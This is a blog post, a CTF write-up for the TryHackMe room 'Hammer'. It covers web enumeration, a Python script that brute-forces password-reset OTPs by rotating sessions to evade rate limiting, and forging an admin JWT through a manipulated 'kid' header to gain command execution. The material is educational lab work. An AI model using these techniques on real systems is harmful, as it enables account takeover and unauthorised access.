<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Hammer" /><meta name="author" content="Ibrahim" /><meta property="og:locale" content="en" /><meta name="description" content="Use your exploitation skills to bypass authentication mechanisms on a website and get RCE." /><meta property="og:description" content="Use your exploitation skills to bypass authentication mechanisms on a website and get RCE." /><link rel="canonical" href="/posts/hammer/" /><meta property="og:url" content="/posts/hammer/" /><meta property="og:site_name" content="Ibrahim EO." /><meta property="og:image" content="/assets/img/tryhackme/hammer/hammer.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-01-05T00:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/tryhackme/hammer/hammer.png" /><meta property="twitter:title" content="Hammer" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Ibrahim" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Ibrahim"},"dateModified":"2025-01-05T00:00:00+01:00","datePublished":"2025-01-05T00:00:00+01:00","description":"Use your exploitation skills to bypass authentication mechanisms on a website and get RCE.","headline":"Hammer","image":"/assets/img/tryhackme/hammer/hammer.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/hammer/"},"url":"/posts/hammer/"}</script><title>Hammer | Ibrahim EO.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ibrahim EO."><meta name="application-name" content="Ibrahim EO."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/elomarii-portfolio.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=G-X4YT79QSQC"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-X4YT79QSQC'); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/whoami">Ibrahim EO.</a></h1><p class="site-subtitle fst-italic mb-0">Information Systems Engineer / InfoSec Enthousiaste</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-bars-progress"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-newspaper"></i> <span>BLOG</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-chess-rook"></i> <span>WHOAMI</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/elomarii" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/ibrahim-el-omari/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="javascript:location.href = 'mailto:' + ['i.ibrahim.elomari','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Hammer</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Hammer</h1><p class="post-desc fw-light mb-4">Use your exploitation skills to bypass authentication mechanisms on a website and get RCE.</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1736031600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 5, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> Ibrahim </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="973 words" > <em>5 min</em> read</span></div></div></div></header><div class="content"><p><a href="/assets/img/tryhackme/hammer/banner.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/banner.png" alt="banner" loading="lazy"></a></p><blockquote class="prompt-info"><p>With the Hammer in hand, can you bypass the authentication mechanisms and get RCE on the system? Check out <a href="https://tryhackme.com/r/room/hammer">Hammer</a> on TryHackMe.</p></blockquote><h2 id="i-eumeration"><span class="me-2">I. Eumeration</span><a href="#i-eumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> &lt;target_ip&gt; <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-Pn</span> <span class="nt">-n</span>                                                     
<span class="go">
</span><span class="gp">Nmap scan report for &lt;target_ip&gt;</span><span class="w">
</span><span class="go">Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
                 
</span><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> &lt;target_ip&gt; <span class="nt">-p</span> 22,1337
<span class="go">
</span><span class="gp">Nmap scan report for &lt;target_ip&gt;</span><span class="w">
</span><span class="go">Host is up (0.020s latency).
PORT     STATE SERVICE VERSION
</span><span class="gp">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>The web app on port 1337 shows a login form.</p><p class="browserize" url="http://&lt;target_ip&gt;:1337/"><a href="/assets/img/tryhackme/hammer/image.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/image.png" alt="alt text" loading="lazy"></a></p><p>Remember, the focus of this room is on authentication. Our enumeration should target finding credentials or anything related to authentication and authorization.</p><p>When viewing the page source, there’s a comment mentioning directories with the prefix <code class="language-plaintext highlighter-rouge">hmr_</code>.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Login<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/hmr_css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
	<span class="c">&lt;!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME --&gt;</span>

<span class="c">&lt;!-- ...snip... --&gt;</span>
</pre></table></code></div></div><p>We use this hint to enumerate directories/files of the web app.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt:FUZZ <span class="nt">-u</span> <span class="s2">"http://&lt;target_ip&gt;:1337/hmr_FUZZ"</span> 
<span class="go">
...SNIP...
css                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 27ms]
images                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 23ms]
js                      [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 29ms]
logs                    [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 24ms]
</span></pre></table></code></div></div><p>The logs directory looks very interesting. From there, we can access a log file at <code class="language-plaintext highlighter-rouge">http://&lt;logs&gt;:1337/hmr_logs/error.logs</code>. By accessing that file, we find an email address linked to hammer.thm.If we proceed with the password reset process using an email that doesn’t have an account in the web app database, we would see an error message. However, using the email found in the log file, we proceed without any issues to the OTP verification.</p><div file="/hmr_logs/error.logs" class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="/hmr_logs/error.logs"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
</pre></table></code></div></div><p>We will proceed with our testing with the email address <code class="language-plaintext highlighter-rouge">tester@hammer.thm</code>.</p><h2 id="ii-otp-brute-force"><span class="me-2">II. OTP Brute Force</span><a href="#ii-otp-brute-force" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Reset password process at <code class="language-plaintext highlighter-rouge">/reset_password.php</code>: provide a valid email address, then enter the OTP sent to the same address in a time limit of 180 seconds.</p><p><a href="/assets/img/tryhackme/hammer/image-2.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/image-2.png" alt="alt text" loading="lazy"></a></p><p>Attempting random OTPs triggers a rate limit error after the 8th attempt, preventing brute-force attacks within a single session.</p><p>To bypass this, we must create a new session for each attempt and use a predefined list of 8 random OTPs (probability wise we get the best chance for a match in a given session). In each iteration, we aim for the session’s valid OTP to match one from our list.</p><p>Once the correct OTP is identified, we extract the session cookie and use it to reset the password, thereby gaining control of the tester account. The Python code below implements this strategy.</p><div file="hammer.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="hammer.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>

<span class="n">reset_url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://&lt;target_ip&gt;:1337/reset_password.php</span><span class="sh">'</span>
<span class="n">email</span> <span class="o">=</span> <span class="sh">'</span><span class="s">tester@hammer.thm</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">otps</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1337</span><span class="p">,</span> <span class="mi">1338</span><span class="p">,</span> <span class="mi">1339</span><span class="p">,</span> <span class="mi">1340</span><span class="p">,</span> <span class="mi">1341</span><span class="p">,</span> <span class="mi">1342</span><span class="p">,</span> <span class="mi">1343</span><span class="p">,</span> <span class="mi">1344</span><span class="p">]</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">init new session</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
        <span class="n">rsp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">reset_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">email</span><span class="sh">'</span><span class="p">:</span> <span class="n">email</span><span class="p">})</span>
        <span class="nf">if </span><span class="p">(</span><span class="sh">'</span><span class="s">You can enter your code</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">rsp</span><span class="p">.</span><span class="n">text</span><span class="p">):</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">sending otps ...</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">otp</span> <span class="ow">in</span> <span class="n">otps</span><span class="p">:</span>
                <span class="n">reset</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">reset_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">recovery_code</span><span class="sh">'</span><span class="p">:</span> <span class="n">otp</span><span class="p">,</span> <span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">:</span><span class="mi">150</span><span class="p">})</span>
                <span class="k">if</span> <span class="n">reset</span><span class="p">.</span><span class="n">text</span> <span class="o">==</span> <span class="sh">'</span><span class="s">Rate limit exceeded. Please try again later.</span><span class="sh">'</span><span class="p">:</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">rate limit exeeded</span><span class="sh">'</span><span class="p">)</span>
                    <span class="k">break</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="sh">"</span><span class="s">Invalid or expired recovery code!</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">reset</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Got session: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">session</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">PHPSESSID</span><span class="sh">'</span><span class="p">))</span>
                    <span class="nf">exit</span><span class="p">()</span>

<span class="nf">main</span><span class="p">()</span>
</pre></table></code></div></div><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 hammer.py
<span class="go">
...SNIP...
init new session
sending otps ...
init new session
sending otps ...
Got session: 141k08bqja7cii6g78slofblig
</span></pre></table></code></div></div><p>Put the session cookie in the right place and refresh the page.. Boom.. changed your password tester.</p><p class="browserize" url="http://&lt;target_ip&gt;:1337/reset_password.php"><a href="/assets/img/tryhackme/hammer/image-3.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/image-3.png" alt="alt text" loading="lazy"></a></p><p class="browserize" url="http://&lt;target_ip&gt;:1337/dashboard.php"><a href="/assets/img/tryhackme/hammer/image-4.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/image-4.png" alt="alt text" loading="lazy"></a></p><h2 id="iii-jwt-exploitation"><span class="me-2">III. JWT Exploitation</span><a href="#iii-jwt-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Once logged in, the dashboard page allows the user to execute a few commands. I think the only one that was successfully executed was <code class="language-plaintext highlighter-rouge">ls</code>.</p><p>I moved to Burp to investigate the requests in more depth.</p><p>Upon login, a JWT token is sent back for the user to use in further requests.</p><p><a href="/assets/img/tryhackme/hammer/image-5.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/image-5.png" alt="alt text" loading="lazy"></a></p><p>The token is used to authenticate/authorize the user when executing commands.</p><p><a href="/assets/img/tryhackme/hammer/image-6.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/image-6.png" alt="alt text" loading="lazy"></a></p><p>The content of the JWT token:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="err">//</span><span class="w"> </span><span class="err">headers</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HS256"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/var/www/mykey.key"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="err">//</span><span class="w"> </span><span class="err">data</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"iss"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://hammer.thm"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"aud"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://hammer.thm"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"iat"</span><span class="p">:</span><span class="w"> </span><span class="mi">1736609939</span><span class="p">,</span><span class="w">
  </span><span class="nl">"exp"</span><span class="p">:</span><span class="w"> </span><span class="mi">1736613539</span><span class="p">,</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"user_id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
    </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"tester@hammer.thm"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"user"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>An interesting detail is the use of <code class="language-plaintext highlighter-rouge">kid</code> in the JWT header. Since a JWT is designed to contain all the necessary information to authenticate a user in a decentralized manner, I initially assumed that <code class="language-plaintext highlighter-rouge">kid</code> specifies the path to the secret key used to sign the token.</p><p>During exploration, we discovered a key file using the <code class="language-plaintext highlighter-rouge">ls</code> command. By accessing the file through the web application at <code class="language-plaintext highlighter-rouge">http://&lt;target_ip&gt;:1337/188ad1.key</code>, we retrieved its contents.</p><div file="188ade1.key" class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="188ade1.key"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>56058354efb3daa97ebab00fabd7a7d7
</pre></table></code></div></div><p>To exploit this, we set the kid value in the JWT header to <code class="language-plaintext highlighter-rouge">/vaar/www/html/188ade1.key</code>, pointing directly to the key file for token verification.</p><p>We can use <a href="https://jwt.io">JWT.io</a> to forge a new token with admin role.</p><p class="browserize" url="https://jwt.io"><a href="/assets/img/tryhackme/hammer/image-7.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/image-7.png" alt="alt text" loading="lazy"></a></p><p>Send the post request to <code class="language-plaintext highlighter-rouge">/execute_command.php</code> to the repeater tab and change the value of the header <code class="language-plaintext highlighter-rouge">Authorization: bearer &lt;token&gt;</code> to the new value.</p><p>Congrats, you can now execute any command as the user <code class="language-plaintext highlighter-rouge">www-data</code>.</p><p><a href="/assets/img/tryhackme/hammer/image-8.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/hammer/image-8.png" alt="alt text" loading="lazy"></a></p><p>To finish the challege, execute <code class="language-plaintext highlighter-rouge">cat /home/ubuntu/flag.txt</code>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/ctf-writeups/">CTF Writeups</a>, <a href="/blog/tryhackme/">TryHackMe</a>, <a href="/blog/web-pentest/">Web Pentest</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/jwt/" class="post-tag no-text-decoration" >JWT</a> <a href="/tags/otp/" class="post-tag no-text-decoration" >OTP</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >RCE</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hammer%20-%20Ibrahim%20EO.&url=%2Fposts%2Fhammer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hammer%20-%20Ibrahim%20EO.&u=%2Fposts%2Fhammer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fhammer%2F&text=Hammer%20-%20Ibrahim%20EO." target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/projects/attack-titan/">The Attack Titan</a><li class="text-truncate lh-lg"> <a href="/projects/chirpy-react/">Chirpy React</a><li class="text-truncate lh-lg"> <a href="/projects/passman/">PassMan</a><li class="text-truncate lh-lg"> <a href="/posts/hammer/">Hammer</a><li class="text-truncate lh-lg"> <a href="/posts/boogeyman-3/">Boogeyman 3</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/dfir/">DFIR</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">Cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a> <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">Phishing</a> <a class="post-tag btn btn-outline-primary" href="/tags/wireshark/">Wireshark</a> <a class="post-tag btn btn-outline-primary" href="/tags/elk/">ELK</a> <a class="post-tag btn btn-outline-primary" href="/tags/gpg/">GPG</a> <a class="post-tag btn btn-outline-primary" href="/tags/kibana/">Kibana</a> <a class="post-tag btn btn-outline-primary" href="/tags/apache2/">Apache2</a> <a class="post-tag btn btn-outline-primary" href="/tags/aws/">AWS</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/overpass-3-hosting/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1710284400" data-df="ll" > Mar 13, 2024 </time><h4 class="pt-0 my-2">Overpass 3 Hosting</h4><div class="text-muted"><p>You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...</p></div></div></a></article><article class="col"> <a href="/posts/overpass-2-hacked/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1710198000" data-df="ll" > Mar 12, 2024 </time><h4 class="pt-0 my-2">Overpass 2 Hacked</h4><div class="text-muted"><p>Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the a...</p></div></div></a></article><article class="col"> <a href="/posts/overpass/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1710025200" data-df="ll" > Mar 10, 2024 </time><h4 class="pt-0 my-2">Overpass</h4><div class="text-muted"><p>What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success!</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/projects/chirpy-react/" class="btn btn-outline-primary" aria-label="Older" ><p>Chirpy React</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/elomarii">Ibrahim El Omari</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >All rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.0.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/dfir/">DFIR</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">Cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a> <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">Phishing</a> <a class="post-tag btn btn-outline-primary" href="/tags/wireshark/">Wireshark</a> <a 